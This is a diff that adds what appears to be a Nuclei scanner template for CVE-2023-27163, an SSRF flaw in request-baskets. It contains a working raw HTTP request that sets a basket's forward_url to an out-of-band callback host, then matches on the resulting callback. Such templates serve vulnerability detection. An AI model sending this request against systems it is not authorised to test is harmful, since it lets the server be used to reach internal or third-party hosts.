@@ -1,0 +1,78 @@
+id: CVE-2023-27163
+
+info:
+  author: Esonhugh-self-maintained
+  name: CVE-2023-27163 request-baskets ssrf
+  severity: high
+  description: |
+    This is a SSRF vulnerability in the request baskets (web application). 
+    https://github.com/darklynx/request-baskets
+  reference:
+    - "https://notes.sjtu.edu.cn/s/MUUhEymt7"
+    - "https://github.com/advisories/GHSA-58g2-vgpg-335q"
+  tags: ssrf,proxy,oast,cve,cve2023
+
+variables:
+  basket: "{{ rand_base(5) }}"
+  ssrf_url: "{{ interactsh_url }}"
+
+http:
+  - raw:
+      - |
+        POST /api/baskets/{{basket}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/web/lep1qbi
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {"forward_url":"{{ssrf_url}}","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":200}
+
+    extractors:
+      - type: dsl
+        name: path
+        dsl:
+          - " basket "
+      - type: json
+        name: token
+        json:
+          - ".token"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+      - type: word
+        part: header
+        words:
+          - "Created"
+      - type: word
+        part: body
+        words:
+          - "token"
+
+  - path:
+      - "{{BaseURL}}/{{basket}}"
+      - "{{BaseURL}}{{basket}}"
+
+    extractors:
+      - type: dsl
+        name: Content
+        dsl:
+          - " body "
+    matchers-condition: and
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 4a0a00473045022100d9ff4be604d06047405933ad6316f1db497307ba97497af5f8c0f80776e8efd802202663a4460327e15e2cadf019e2d510c408a6f086333ee07c7704ee5267af1628:569246fd1e83ae0648e1a21ffb4fe811
